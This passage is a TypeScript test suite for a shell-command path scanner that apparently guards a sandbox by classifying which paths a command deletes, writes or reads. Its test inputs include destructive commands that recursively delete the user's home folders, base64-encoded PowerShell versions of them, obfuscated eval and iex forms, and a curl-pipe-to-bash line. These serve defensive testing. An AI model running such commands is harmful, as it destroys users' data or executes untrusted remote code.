/**
 * shellPaths.ts (F242, layer 2): the paths a shell command or an argv names. Pure: every case runs on
 * an injected home map, with literal Windows paths under platform win32 and posix paths under posix,
 * so the Windows-spelled attacks are proved on Linux too. Nothing here touches a disk.
 */
import { describe, expect, it } from 'vitest'
import { scanArgv, scanShellText, type HomeMap, type ShellPath, type ShellScan } from '../../tools/shellPaths.js'

const W: HomeMap = {
  home: 'C:\\Users\\u',
  appData: 'C:\\Users\\u\\AppData\\Roaming',
  localAppData: 'C:\\Users\\u\\AppData\\Local',
  temp: 'C:\\cynco-sandbox\\run1\\tmp',
  scratch: 'C:\\cynco-sandbox\\run1\\scratch',
  user: 'u',
}
const BASE = 'C:\\Users\\u\\proj'
const X: HomeMap = { home: '/home/u', appData: '/home/u/AppData/Roaming', localAppData: '/home/u/AppData/Local', temp: '/sb/run1/tmp', scratch: '/sb/run1/scratch', user: 'u' }
const XBASE = '/work/proj'

const scan = (cmd: string, homes: HomeMap = W, base = BASE): ShellScan => scanShellText(cmd, base, homes, { platform: homes === W ? 'win32' : 'posix' })
const ofOp = (s: ShellScan, ...ops: string[]): ShellPath[] => s.paths.filter(p => ops.includes(p.op))
const pathsOf = (s: ShellScan, ...ops: string[]): string[] => ofOp(s, ...ops).map(p => p.path as string)
const lower = (xs: string[]) => xs.map(x => x.toLowerCase())

describe('home spellings resolve to the injected home (win32)', () => {
  const spellings = [
    '$HOME', '${HOME}', '$env:USERPROFILE', '${env:USERPROFILE}', '$Env:UserProfile', '%USERPROFILE%', '!USERPROFILE!',
    '$env:HOMEDRIVE$env:HOMEPATH', '%HOMEDRIVE%%HOMEPATH%', '~', '(Resolve-Path ~)',
    "[Environment]::GetFolderPath('UserProfile')", '[System.Environment]::GetFolderPath("UserProfile")',
    'Path.home()', 'pathlib.Path.home()', "os.path.expanduser('~')", "os.environ['USERPROFILE']",
    'os.environ.get("HOME")', "os.getenv('USERPROFILE')", 'os.homedir()', "require('os').homedir()",
    "require('os').userInfo().homedir", 'process.env.USERPROFILE', 'C:\\Users\\$env:USERNAME', 'C:\\Users\\%USERNAME%',
  ]
  for (const sp of spellings) {
    it(`Remove-Item -Recurse ${sp}\\.x`, () => {
      const s = scan(`Remove-Item -Recurse ${sp}\\.x`)
      expect(lower(pathsOf(s, 'delete'))).toContain('c:\\users\\u\\.x')
      expect(s.unresolvedMutation).toBeNull()
    })
  }
  it('expanduser("~/.x") is the home plus the tail', () => {
    expect(pathsOf(scan('Remove-Item -Recurse expanduser("~/.x")'), 'delete')).toEqual(['C:\\Users\\u\\.x'])
  })
  it('in the posix dialect too', () => {
    expect(pathsOf(scan('rm -rf $HOME/.x', X, XBASE), 'delete')).toEqual(['/home/u/.x'])
  })
})

describe('APPDATA, TEMP and CYNCO_SCRATCH spellings', () => {
  it('APPDATA and LOCALAPPDATA resolve to the injected folders', () => {
    expect(pathsOf(scan('Remove-Item $env:APPDATA\\x'), 'delete')).toEqual(['C:\\Users\\u\\AppData\\Roaming\\x'])
    expect(pathsOf(scan('Remove-Item %LOCALAPPDATA%\\x'), 'delete')).toEqual(['C:\\Users\\u\\AppData\\Local\\x'])
  })
  for (const sp of ['$env:TEMP', '%TMP%', '[IO.Path]::GetTempPath()', 'tempfile.gettempdir()', 'os.tmpdir()']) {
    it(`${sp} is the injected temp`, () => {
      expect(pathsOf(scan(`Remove-Item ${sp}\\x`), 'delete')).toEqual(['C:\\cynco-sandbox\\run1\\tmp\\x'])
    })
  }
  for (const sp of ['$env:CYNCO_SCRATCH', '%CYNCO_SCRATCH%', '$CYNCO_SCRATCH', "os.environ['CYNCO_SCRATCH']", 'process.env.CYNCO_SCRATCH']) {
    it(`${sp} is the injected scratch, and unreadable when there is none`, () => {
      expect(pathsOf(scan(`Remove-Item ${sp}\\x`), 'delete')).toEqual(['C:\\cynco-sandbox\\run1\\scratch\\x'])
      const none = scan(`Remove-Item ${sp}\\x`, { ...W, scratch: null })
      expect(pathsOf(none, 'delete')).toEqual([])
      expect(none.unresolvedMutation?.op).toBe('delete')
    })
  }
})

describe('absolute forms', () => {
  it('drive, quoted, UNC, device and provider spellings', () => {
    expect(pathsOf(scan('Remove-Item C:\\a\\b'), 'delete')).toEqual(['C:\\a\\b'])
    expect(pathsOf(scan('Remove-Item C:/a/b'), 'delete')).toEqual(['C:\\a\\b'])
    expect(pathsOf(scan('Remove-Item "C:\\a b\\c"'), 'delete')).toEqual(['C:\\a b\\c'])
    expect(pathsOf(scan('Remove-Item \\\\server\\share\\x'), 'delete')).toEqual(['\\\\server\\share\\x'])
    expect(pathsOf(scan('Remove-Item \\\\?\\C:\\a'), 'delete')).toEqual(['C:\\a'])
    expect(pathsOf(scan('Remove-Item \\\\?\\UNC\\s\\sh\\x'), 'delete')).toEqual(['\\\\s\\sh\\x'])
    const dev = scan('Remove-Item \\\\.\\PhysicalDrive0')
    expect(ofOp(dev, 'delete')[0].device).toBe(true)
    expect(pathsOf(scan('Remove-Item file:///C:/a'), 'delete')).toEqual(['C:\\a'])
    expect(pathsOf(scan('Remove-Item FileSystem::C:\\a'), 'delete')).toEqual(['C:\\a'])
  })
  it('the msys form needs a segment after the drive letter; a bare /c is not a drive', () => {
    expect(pathsOf(scan('rm -rf /c/Users/x'), 'delete')).toEqual(['C:\\Users\\x'])
    expect(pathsOf(scan('rm -rf /c'), 'delete')).toEqual(['C:\\c'])
  })
  it('posix: a backslash tail joins a posix anchor, and a drive word is kept as written', () => {
    expect(pathsOf(scan('Remove-Item $env:USERPROFILE\\.x', X, XBASE), 'delete')).toEqual(['/home/u/.x'])
    expect(pathsOf(scan('Remove-Item C:\\a', X, XBASE), 'delete')).toEqual(['C:\\a'])
  })
})

describe('parent traversal and cd tracking', () => {
  it('resolves against the base and follows cd', () => {
    expect(pathsOf(scan('Remove-Item ..\\..\\.cynco -Recurse'), 'delete')).toEqual(['C:\\Users\\.cynco'])
    expect(pathsOf(scan('cd ..; rm -rf other'), 'delete')).toEqual(['C:\\Users\\u\\other'])
    expect(pathsOf(scan('Set-Location $env:USERPROFILE; Remove-Item .cynco -Recurse'), 'delete')).toEqual(['C:\\Users\\u\\.cynco'])
  })
  it('an unreadable cd makes later relative write-class operands unreadable', () => {
    const s = scan('cd $d; Remove-Item x -Recurse')
    expect(pathsOf(s, 'delete')).toEqual([])
    expect(s.unresolvedMutation).toEqual({ op: 'delete', verb: 'remove-item', recursive: true })
  })
})

describe('wildcards and the quoted-prefix split', () => {
  it('rm -rf ~/.*/ is the home with children', () => {
    const [p] = ofOp(scan('rm -rf ~/.*/'), 'delete')
    expect(p.path).toBe('C:\\Users\\u')
    expect(p.children).toBe(true)
    expect(p.recursive).toBe(true)
  })
  it('Remove-Item .\\build\\* is base\\build with children', () => {
    const [p] = ofOp(scan('Remove-Item .\\build\\*'), 'delete')
    expect(p.path).toBe('C:\\Users\\u\\proj\\build')
    expect(p.children).toBe(true)
  })
  it('"$HOME"/.cynco yields the home and home/.cynco; $env:USERPROFILE\'\\.x\' yields one path', () => {
    expect(pathsOf(scan('rm -rf "$HOME"/.cynco'), 'delete')).toEqual(['C:\\Users\\u', 'C:\\Users\\u\\.cynco'])
    expect(pathsOf(scan("Remove-Item $env:USERPROFILE'\\.x'"), 'delete')).toEqual(['C:\\Users\\u\\.x'])
  })
})

describe('pipeline inheritance', () => {
  it('attack 4: one inherited recursive delete on the home', () => {
    const s = scan('Get-ChildItem $env:USERPROFILE -Force -Directory -Filter .* | Remove-Item -Recurse -Force')
    const d = ofOp(s, 'delete')
    expect(d.map(p => p.path)).toEqual(['C:\\Users\\u'])
    expect(d[0].inherited).toBe(true)
    expect(d[0].recursive).toBe(true)
  })
  it('find | xargs rm -rf inherits the same way', () => {
    const d = ofOp(scan("find ~ -name '.*' | xargs rm -rf"), 'delete')
    expect(d.map(p => [p.path, p.inherited])).toEqual([['C:\\Users\\u', true]])
  })
  it('a mention is inherited by a mutating verb, and an Out-File with its own target inherits nothing', () => {
    expect(pathsOf(scan('Write-Output ~\\.cynco | Remove-Item -Recurse'), 'delete')).toEqual(['C:\\Users\\u\\.cynco'])
    const s = scan('Get-ChildItem ~ | Out-File dots.txt')
    expect(pathsOf(s, 'list')).toEqual(['C:\\Users\\u'])
    expect(pathsOf(s, 'write')).toEqual(['C:\\Users\\u\\proj\\dots.txt'])
    expect(pathsOf(s, 'delete')).toEqual([])
  })
  it('a ForEach-Object block takes $_ from the pipeline around it', () => {
    expect(pathsOf(scan('Get-ChildItem ~ -Force | ForEach-Object { Remove-Item $_.FullName -Recurse }'), 'delete')).toEqual(['C:\\Users\\u'])
  })
})

describe('grouped expressions', () => {
  it('a value group handed to a path verb is its operand, joined with +', () => {
    expect(pathsOf(scan("Remove-Item -Recurse ([Environment]::GetFolderPath('UserProfile') + '\\.x')"), 'delete')).toEqual(['C:\\Users\\u\\.x'])
    expect(pathsOf(scan('Remove-Item -Recurse ($env:USERPROFILE)'), 'delete')).toEqual(['C:\\Users\\u'])
  })
  it('a command group is a subexpression: unresolved, with its own paths read', () => {
    const s = scan("Remove-Item (Join-Path $env:USERPROFILE 'x') -Recurse")
    expect(pathsOf(s, 'delete')).toEqual([])
    expect(s.unresolvedMutation).toEqual({ op: 'delete', verb: 'remove-item', recursive: true })
    expect(pathsOf(s, 'read')).toContain('C:\\Users\\u')
  })
  it('inside an inline program a call argument is not an operand of the call before it', () => {
    const s = scan(`python -c "import os; open('out/x.txt','w').write(os.path.expanduser('~'))"`)
    expect(ofOp(s, 'unclassified')).toEqual([])
  })
})

describe('cmd payloads', () => {
  it('attack 5', () => {
    const s = scan('cmd /c rd /s /q %USERPROFILE%\\.cynco')
    const d = ofOp(s, 'delete')
    expect(d.map(p => p.path)).toEqual(['C:\\Users\\u\\.cynco'])
    expect(d[0].recursive).toBe(true)
    expect(d[0].via).toBe('shell>cmd /c')
    expect(s.texts.length).toBeGreaterThan(1)
  })
  it('two deletes in one quoted payload', () => {
    expect(pathsOf(scan('cmd /c "del /q C:\\a\\b.txt & rd /s /q C:\\a"'), 'delete')).toEqual(['C:\\a\\b.txt', 'C:\\a'])
  })
  it('mklink /J gives a link with its target', () => {
    const [l] = ofOp(scan('cmd /c mklink /J link C:\\Users\\x'), 'link')
    expect(l.path).toBe('C:\\Users\\u\\proj\\link')
    expect(l.linkTarget).toBe('C:\\Users\\x')
  })
})

describe('constant propagation (2.M1)', () => {
  it('PowerShell, POSIX, Python and JavaScript bindings name a direct target', () => {
    const ps = scan("$t = 'D:\\Video'; Remove-Item $t -Recurse")
    expect(pathsOf(ps, 'delete')).toEqual(['D:\\Video'])
    expect(ps.unresolvedMutation).toBeNull()
    expect(pathsOf(scan('d=/data/x; rm -rf "$d"', X, XBASE), 'delete')).toEqual(['/data/x'])
    expect(pathsOf(scan(`python -c "p = r'D:\\x'; import shutil; shutil.rmtree(p)"`), 'delete')).toContain('D:\\x')
    expect(pathsOf(scan(`node -e "const p = 'D:/x'; require('fs').rmSync(p, { recursive: true })"`), 'delete')).toContain('D:\\x')
  })
  it('a name assigned twice or from a call is unreadable', () => {
    const twice = scan("$t = 'C:\\a'; $t = 'C:\\b'; Remove-Item $t")
    expect(pathsOf(twice, 'delete')).toEqual([])
    expect(twice.unresolvedMutation?.op).toBe('delete')
    const call = scan('$t = Get-Item x; Remove-Item $t')
    expect(pathsOf(call, 'delete')).toEqual([])
    expect(call.unresolvedMutation?.op).toBe('delete')
  })
  it('an assignment to an anchor name rebinds it', () => {
    const [p] = ofOp(scan("$env:TEMP = 'C:\\x'; Remove-Item $env:TEMP\\* -Recurse"), 'delete')
    expect(p.path).toBe('C:\\x')
    expect(p.children).toBe(true)
  })
  it('every right-hand side is also a mention', () => {
    expect(pathsOf(scan("$t = 'D:\\Video'"), 'mention')).toEqual(['D:\\Video'])
  })
})

describe('the whole-argument rule (2.M1)', () => {
  it('a literal is direct; a method or attribute after it is unresolved', () => {
    const lit = scan(`python -c "import shutil; shutil.rmtree('build')"`)
    expect(pathsOf(lit, 'delete')).toEqual(['C:\\Users\\u\\proj\\build'])
    expect(lit.unresolvedMutation).toBeNull()
    const exp = scan(`python -c "import shutil; from pathlib import Path; shutil.rmtree(Path('~/.cynco').expanduser())"`)
    expect(pathsOf(exp, 'delete')).toEqual([])
    expect(exp.unresolvedMutation?.op).toBe('delete')
    expect(pathsOf(exp, 'mention')).toContain('C:\\Users\\u\\.cynco')
    const par = scan(`python -c "import shutil; from pathlib import Path; shutil.rmtree(Path('.').resolve().parent / '.cynco')"`)
    expect(par.unresolvedMutation?.op).toBe('delete')
    expect(par.parentClimb).toBeGreaterThanOrEqual(1)
  })
  it('os.path.dirname(os.getcwd()) counts one climb', () => {
    const s = scan(`python -c "import os, shutil; shutil.rmtree(os.path.dirname(os.getcwd()))"`)
    expect(s.unresolvedMutation?.op).toBe('delete')
    expect(s.parentClimb).toBe(1)
  })
})

describe('inline code', () => {
  it('open(..., "w") is a direct write and no unresolved mutation', () => {
    const s = scan(`python -c "open('out/x.txt','w')"`)
    expect(pathsOf(s, 'write')).toEqual(['C:\\Users\\u\\proj\\out\\x.txt'])
    expect(s.unresolvedMutation).toBeNull()
  })
  it('shutil.copy reads the source and writes the destination; raw strings are unescaped', () => {
    const s = scan(`python -c "import shutil; shutil.copy(r'C:\\a\\b', 'c')"`)
    expect(pathsOf(s, 'read')).toContain('C:\\a\\b')
    expect(pathsOf(s, 'write')).toEqual(['C:\\Users\\u\\proj\\c'])
  })
  it('doubled backslashes are unescaped', () => {
    expect(pathsOf(scan(`python -c "import os; os.remove('C:\\\\a\\\\b')"`), 'delete')).toEqual(['C:\\a\\b'])
  })
  it('a concatenation is an unresolved delete and a home mention', () => {
    const s = scan(`node -e "require('fs').rmSync(require('os').homedir()+'/.x',{recursive:true})"`)
    expect(s.unresolvedMutation).toEqual({ op: 'delete', verb: expect.any(String), recursive: true })
    expect(pathsOf(s, 'mention')).toContain('C:\\Users\\u')
  })
})

describe('here-documents and here-strings by consumer (2.M2)', () => {
  const body = "from pathlib import Path\np = Path.home() / '.civkings'\nopen(p, 'w')\nimport shutil\nshutil.rmtree(p2)"
  it('a body fed to an interpreter is code', () => {
    for (const cmd of [`@'\n${body}\n'@ | python -`, `python - <<'EOF'\n${body}\nEOF`]) {
      const s = scan(cmd)
      expect(s.texts).toContain(body)
      expect(s.unresolvedMutation?.op).toBe('delete')
      expect(pathsOf(s, 'mention')).toContain('C:\\Users\\u')
    }
  })
  it('the same body written to a file is data', () => {
    for (const cmd of [`@'\n${body}\n'@ | Set-Content src\\save.py`, `cat > x.py <<'EOF'\n${body}\nEOF`]) {
      const s = scan(cmd)
      expect(s.texts).toContain(body)
      expect(s.unresolvedMutation).toBeNull()
      expect(ofOp(s, 'mention')).toEqual([])
      expect(s.selfBuilding).toBeNull()
      expect(ofOp(s, 'write').length).toBe(1)
    }
  })
  it('a here-string bound to a name and passed to python -c is code; a computed name is self-building', () => {
    const s = scan(`$code = @'\n${body}\n'@\npython -c $code`)
    expect(s.unresolvedMutation?.op).toBe('delete')
    expect(scan('$x = Get-Thing; python -c $x').selfBuilding).toBe('an inline program passed through a variable that cannot be read')
  })
})

describe('names nothing', () => {
  it('echo, Write-Host, Write-Output and printf operands are mentions; a redirect after them is a write', () => {
    for (const v of ['echo', 'Write-Host', 'Write-Output', 'printf']) {
      const s = scan(`${v} C:\\Users\\u\\.cache`)
      expect(pathsOf(s, 'mention')).toEqual(['C:\\Users\\u\\.cache'])
      expect(ofOp(s, 'write', 'delete', 'unclassified')).toEqual([])
    }
    expect(pathsOf(scan('echo x > out.txt'), 'write')).toEqual(['C:\\Users\\u\\proj\\out.txt'])
  })
})

describe('-EncodedCommand', () => {
  const attack4 = 'Get-ChildItem $env:USERPROFILE -Force -Directory -Filter .* | Remove-Item -Recurse -Force'
  const b64 = Buffer.from(attack4, 'utf16le').toString('base64')
  for (const flag of ['-e', '-ec', '-en', '-enc', '-enco', '-EncodedCommand', '-encodedc']) {
    it(`powershell ${flag} decodes into texts and yields the inherited delete`, () => {
      const s = scan(`powershell -NoProfile ${flag} ${b64}`)
      expect(s.texts).toContain(attack4)
      expect(ofOp(s, 'delete').map(p => [p.path, p.inherited])).toEqual([['C:\\Users\\u', true]])
    })
  }
  it('a base64 word that is not text is self-building', () => {
    const junk = Buffer.from([0x00, 0xd8, 0x01, 0x00, 0x02, 0x00, 0x00, 0xdc]).toString('base64')
    expect(scan(`powershell -enc ${junk}`).selfBuilding).toBe('an -EncodedCommand that does not decode to text')
  })
})

describe('self-building markers', () => {
  for (const cmd of ['Invoke-Expression $x', 'iex $x', '[Convert]::FromBase64String($s)', '[scriptblock]::Create($s)',
    'eval "$x"', 'echo aGk= | base64 -d | sh', "&('Rem'+'ove-Item') x",
    `python -c "import base64; exec(base64.b64decode('cHJpbnQoMSk='))"`, `node -e "eval(atob('MQ=='))"`]) {
    it(cmd, () => { expect(scan(cmd).selfBuilding).not.toBeNull() })
  }
  it('a plain eval in python does not', () => {
    expect(scan(`python -c "print(eval('1+1'))"`).selfBuilding).toBeNull()
  })
})

describe('copy, move and redirects', () => {
  it('copy and move operands', () => {
    const cp = scan('Copy-Item C:\\lib\\x.py .\\vendor\\x.py')
    expect(pathsOf(cp, 'read')).toEqual(['C:\\lib\\x.py'])
    expect(pathsOf(cp, 'write')).toEqual(['C:\\Users\\u\\proj\\vendor\\x.py'])
    const mv = scan('Move-Item a.txt C:\\other\\b.txt')
    expect(pathsOf(mv, 'move')).toEqual(['C:\\Users\\u\\proj\\a.txt'])
    expect(pathsOf(mv, 'write')).toEqual(['C:\\other\\b.txt'])
  })
  it('robocopy /MIR makes the destination delete-class', () => {
    const s = scan('robocopy src dst /MIR')
    expect(pathsOf(s, 'delete')).toEqual(['C:\\Users\\u\\proj\\dst'])
    expect(pathsOf(s, 'read')).toEqual(['C:\\Users\\u\\proj\\src'])
  })
  it('redirect targets are writes, the null devices are nothing', () => {
    expect(pathsOf(scan('python x > out.txt'), 'write')).toEqual(['C:\\Users\\u\\proj\\out.txt'])
    expect(pathsOf(scan('python x >> out.txt'), 'write')).toEqual(['C:\\Users\\u\\proj\\out.txt'])
    expect(pathsOf(scan('python x 2> err.txt'), 'write')).toEqual(['C:\\Users\\u\\proj\\err.txt'])
    for (const cmd of ['python x > $null', 'python x > NUL', 'python x >/dev/null', 'python x 2>&1']) expect(ofOp(scan(cmd), 'write')).toEqual([])
  })
})

describe('program position', () => {
  it('an .exe or extensionless program is not a target', () => {
    for (const cmd of ['& "C:\\Users\\x\\.bun\\bin\\bun.exe" test', 'C:\\Py\\python.exe -m pytest', 'Start-Process C:\\Py\\python.exe -ArgumentList x']) {
      expect(scan(cmd).paths).toEqual([])
    }
  })
  it('a script is an exec target; -m names nothing', () => {
    expect(pathsOf(scan('python C:\\a\\tool.py'), 'exec')).toEqual(['C:\\a\\tool.py'])
    expect(pathsOf(scan('.\\run.ps1'), 'exec')).toEqual(['C:\\Users\\u\\proj\\run.ps1'])
    expect(scan('python -m pytest tests/').paths).toEqual([])
  })
})

describe('git through scanShellText', () => {
  it('-C and the write targets', () => {
    expect(pathsOf(scan('git -C C:\\other commit -m x'), 'write')).toEqual(['C:\\other'])
    expect(pathsOf(scan('git -C C:\\other log'), 'write')).toEqual(['C:\\other'])
    expect(pathsOf(scan('git worktree add ..\\wt'), 'write')).toEqual(['C:\\Users\\u\\wt'])
    expect(pathsOf(scan('git init C:\\x'), 'write')).toEqual(['C:\\x'])
    expect(pathsOf(scan('git clone . C:\\x'), 'write')).toEqual(['C:\\x'])
    expect(pathsOf(scan('git format-patch -o C:\\x'), 'write')).toEqual(['C:\\x'])
    expect(pathsOf(scan('git apply C:\\tmp\\p.patch'), 'read')).toEqual(['C:\\tmp\\p.patch'])
    expect(scan('git commit -m "fix ~/.cynco handling"').paths).toEqual([])
    expect(scan('git commit -am "~/.cache cleanup"').paths).toEqual([])
  })
  it('destructive subcommands set gitDestructive and name their path operands', () => {
    const cases: Array<[string, string[]]> = [
      ['git checkout -- a.py', ['C:\\Users\\u\\proj\\a.py']],
      ['git restore a.py', ['C:\\Users\\u\\proj\\a.py']],
      ['git rm -r old', ['C:\\Users\\u\\proj\\old']],
      ['git clean -fdx', ['C:\\Users\\u\\proj']],
      ['git stash drop', []],
      ['git stash pop', []],
      ['git reset --hard HEAD~1', []],
      ['git worktree remove ..\\wt', ['C:\\Users\\u\\wt']],
    ]
    for (const [cmd, paths] of cases) {
      const s = scan(cmd)
      expect(s.gitDestructive, cmd).toBe(true)
      expect(pathsOf(s, 'write', 'delete'), cmd).toEqual(paths)
    }
    for (const cmd of ['git stash list', 'git checkout -b x', 'git clean -n']) expect(scan(cmd).gitDestructive, cmd).toBe(false)
  })
  it('git config writes of a setting', () => {
    expect(scan('git config core.fsmonitor "x"').gitConfigWrite).toBe('core.fsmonitor')
    expect(scan('git config --global core.pager x').gitConfigWrite).toBe('core.pager')
    expect(scan('git config --system user.name x').gitConfigWrite).toBe('user.name')
    for (const cmd of ['git config user.name x', 'git config --get core.pager', 'git config -l']) expect(scan(cmd).gitConfigWrite, cmd).toBeNull()
  })
})

describe('scanArgv (2.M3)', () => {
  const argv = (words: string[]) => scanArgv(words, BASE, W, { platform: 'win32' })
  it('no comment handling, no message candidates, no expansion', () => {
    expect(pathsOf(argv(['git', 'diff', 'HEAD', '#', '--output=C:\\out\\x']), 'write')).toEqual(['C:\\out\\x'])
    expect(argv(['git', 'commit', '-m', 'fix # of ~/.cynco']).paths).toEqual([])
    expect(pathsOf(argv(['git', '--work-tree=$HOME', 'status']), 'write')).toEqual(['C:\\Users\\u\\proj\\$HOME'])
    expect(argv(['git', 'commit', '-m', 'git checkout -- x']).gitDestructive).toBe(false)
    expect(argv(['git', 'commit', '-m', 'x']).texts).toEqual([])
  })
})

describe('unclassified operands', () => {
  it('a home dot-folder handed to an unknown program', () => {
    expect(pathsOf(scan('sometool --out $env:USERPROFILE\\.x'), 'unclassified')).toEqual(['C:\\Users\\u\\.x'])
  })
  it('a script and its argument', () => {
    const s = scan('python scripts/scan.py C:\\lib\\site-packages')
    expect(pathsOf(s, 'exec')).toEqual(['C:\\Users\\u\\proj\\scripts\\scan.py'])
    expect(pathsOf(s, 'unclassified')).toEqual(['C:\\lib\\site-packages'])
  })
})

describe('limits', () => {
  it('a text over 1 MiB and a payload nested five deep are faults, not throws', () => {
    expect(scan('x'.repeat(1.1 * 1024 * 1024)).faults.length).toBeGreaterThan(0)
    const nested = 'powershell -Command '.repeat(6) + 'Remove-Item C:\\a'
    expect(scan(nested).faults.some(f => /nested deeper/.test(f))).toBe(true)
  })
  it('513 paths set truncated; with Remove-Item, sawWrite', () => {
    const list = Array.from({ length: 513 }, (_, i) => `C:\\a\\${i}`).join(' ')
    const read = scan(`Get-Content ${list}`)
    expect(read.truncated).toBe('more than 512 paths in one command')
    expect(read.paths.length).toBe(512)
    expect(read.sawWrite).toBe(false)
    expect(scan(`Remove-Item ${list}`).sawWrite).toBe(true)
  })
  it('never throws on garbage', () => {
    for (const g of ['"unbalanced', "'also", "@'", 'powershell -enc QQ', '', '((((', '$(', '<<EOF', '`', '^']) {
      expect(() => scan(g)).not.toThrow()
      expect(() => scanArgv([g], BASE, W)).not.toThrow()
    }
  })
})

describe('the review of 2026-11-23', () => {
  it('a bare drive word is that drive read lexically, never the process folder', () => {
    expect(pathsOf(scan('Remove-Item D: -Recurse'), 'delete')).toEqual(['D:\\'])
    expect(pathsOf(scan('Remove-Item D:Video -Recurse'), 'delete')).toEqual(['D:\\Video'])
    expect(pathsOf(scan('Remove-Item C: -Recurse'), 'delete')).toEqual([BASE])
    expect(pathsOf(scan('Set-Location D:; Remove-Item Video'), 'delete')).toEqual(['D:\\Video'])
    expect(pathsOf(scan('D:; Remove-Item Video'), 'delete')).toEqual(['D:\\Video'])
    expect(pathsOf(scan('C:; Remove-Item Video'), 'delete')).toEqual([`${BASE}\\Video`])
    expect(pathsOf(scan('cmd /c "cd /d D:\\ && rd /s /q Video"'), 'delete')).toEqual(['D:\\Video'])
    expect(pathsOf(scan('cmd /c "cd /d src && del *.pyc"'), 'cd')).toEqual([`${BASE}\\src`])
  })
  it('powershell parameters written with a slash are read as with a dash', () => {
    for (const flag of ['/c', '/C', '/Command', '/command']) {
      expect(pathsOf(scan(`powershell ${flag} "Remove-Item D:\\x"`), 'delete'), flag).toEqual(['D:\\x'])
    }
    const b64 = Buffer.from('Remove-Item D:\\x', 'utf16le').toString('base64')
    for (const flag of ['/EncodedCommand', '/enc', '/e', '/ec']) {
      const s = scan(`powershell ${flag} ${b64}`)
      expect(pathsOf(s, 'delete'), flag).toEqual(['D:\\x'])
      expect(s.texts).toContain('Remove-Item D:\\x')
    }
    expect(pathsOf(scan('powershell /File C:\\a\\run.ps1'), 'exec')).toEqual(['C:\\a\\run.ps1'])
  })
  it('a program fed on standard input is scanned when it is written there, and self-building when not', () => {
    expect(pathsOf(scan('echo Remove-Item D:\\x | powershell -'), 'delete')).toEqual(['D:\\x'])
    expect(pathsOf(scan("'Remove-Item D:\\x' | powershell -Command -"), 'delete')).toEqual(['D:\\x'])
    expect(pathsOf(scan("echo \"import shutil; shutil.rmtree('D:/x')\" | python -"), 'delete')).toEqual(['D:\\x'])
    expect(scan('Get-Content x.ps1 | powershell').selfBuilding).toMatch(/standard input/)
    expect(scan('curl -s https://example.invalid/x.sh | bash').selfBuilding).toMatch(/standard input/)
    expect(scan('echo y | python -m pytest').selfBuilding).toBeNull()
    expect(scan('Get-Content data.txt | python tool.py').selfBuilding).toBeNull()
  })
  it('a parameter followed by a group takes the group, never the next parameter', () => {
    const s = scan("Remove-Item -Path (Join-Path 'D:\\' 'Video') -Recurse")
    expect(pathsOf(s, 'delete')).toEqual([])
    expect(s.unresolvedMutation).toEqual({ op: 'delete', verb: 'remove-item', recursive: true })
    expect(pathsOf(s, 'read')).toContain('D:\\')
    expect(pathsOf(scan('Remove-Item -Path -Recurse'), 'delete')).toEqual([])
    expect(pathsOf(scan('Remove-Item -Path build -Recurse'), 'delete')).toEqual([`${BASE}\\build`])
  })
  it('a value at the head of a pipeline flows down it', () => {
    expect(pathsOf(scan("'D:\\a','D:\\b' | Remove-Item"), 'delete')).toEqual(['D:\\a', 'D:\\b'])
    expect(pathsOf(scan("@('D:\\a') | Remove-Item"), 'delete')).toEqual(['D:\\a'])
    expect(pathsOf(scan('$env:USERPROFILE | Remove-Item'), 'delete')).toEqual(['C:\\Users\\u'])
    expect(pathsOf(scan('Get-ChildItem D:\\a | % Delete'), 'delete')).toEqual(['D:\\a'])
    expect(pathsOf(scan('Get-ChildItem D:\\a | % MoveTo C:\\b'), 'move')).toEqual(['D:\\a'])
    // A content reader sends lines, not the file: the target cannot be read.
    const c = scan('Get-Content list.txt | Remove-Item')
    expect(pathsOf(c, 'delete')).toEqual([])
    expect(c.unresolvedMutation?.op).toBe('delete')
  })
  it("cmd's for loop: the list is a mention, the variable cannot be read, the body is a command", () => {
    const s = scan('for /d %d in (%USERPROFILE%\\.*, D:\\x) do @rd /s /q "%d"')
    expect(lower(pathsOf(s, 'mention'))).toEqual(expect.arrayContaining(['c:\\users\\u', 'd:\\x']))
    expect(s.unresolvedMutation).toEqual({ op: 'delete', verb: 'rd', recursive: true })
    expect(pathsOf(scan('for /r C:\\src %f in (*.pyc) do del %f'), 'mention')).toContain('C:\\src')
    expect(pathsOf(scan('for %f in (a b) do del %f'), 'delete')).toEqual([])
    // a POSIX for is not cmd's
    expect(pathsOf(scan('for d in ~/.*/; do rm -rf "$d"; done', X, XBASE), 'unclassified')).toContain('/home/u')
  })
  it('%X% with a one-letter name and a cmd set binding', () => {
    expect(pathsOf(scan('cmd /c "set X=D:\\v && rd /s /q %X%"'), 'delete')).toEqual(['D:\\v'])
    expect(pathsOf(scan("$env:X='D:\\v'; cmd /c rd /s /q %X%"), 'delete')).toEqual(['D:\\v'])
  })
  it('the Windows folder variables are anchored to the real home', () => {
    expect(pathsOf(scan('Remove-Item $env:OneDrive\\Desktop'), 'delete')).toEqual(['C:\\Users\\u\\OneDrive\\Desktop'])
    expect(pathsOf(scan('Remove-Item %SystemDrive%\\x'), 'delete')).toEqual(['C:\\x'])
    expect(pathsOf(scan('Remove-Item $env:PUBLIC\\x'), 'delete')).toEqual(['C:\\Users\\Public\\x'])
    expect(pathsOf(scan('Remove-Item $env:ALLUSERSPROFILE\\x'), 'delete')).toEqual(['C:\\ProgramData\\x'])
    expect(pathsOf(scan('rm -rf $OneDrive/x', X, XBASE), 'delete')).toEqual([])
  })
  it('a recursive delete through an unset name and a separator is the root of the drive; a bound one is not', () => {
    expect(ofOp(scan('Remove-Item -Recurse "$env:NOPE\\*"'), 'delete').map(p => [p.path, p.children])).toEqual([['C:\\', true]])
    expect(pathsOf(scan('rm -rf "$NOPE"/*', X, XBASE), 'delete')).toEqual(['/'])
    expect(pathsOf(scan('Remove-Item "$env:NOPE\\x"'), 'delete')).toEqual([])            // not recursive
    expect(pathsOf(scan('$d = Get-Location; Remove-Item -Recurse "$d\\x"'), 'delete')).toEqual([])
    expect(pathsOf(scan('foreach ($d in $list) { Remove-Item -Recurse "$d\\x" }'), 'delete')).toEqual([])
    expect(pathsOf(scan('Remove-Item -Recurse $nope'), 'delete')).toEqual([])
  })
  it('code calls: aliases, bare imports, shell calls and their argv', () => {
    const py = (c: string) => scan(`python -c "${c}"`)
    expect(pathsOf(py("from shutil import rmtree as rt; rt('D:/a')"), 'delete')).toEqual(['D:\\a'])
    expect(pathsOf(py("import shutil as sh; sh.rmtree('D:/a')"), 'delete')).toEqual(['D:\\a'])
    expect(ofOp(py("from os import unlink; unlink('D:/a')"), 'delete').map(p => p.verb)).toContain('os.unlink')
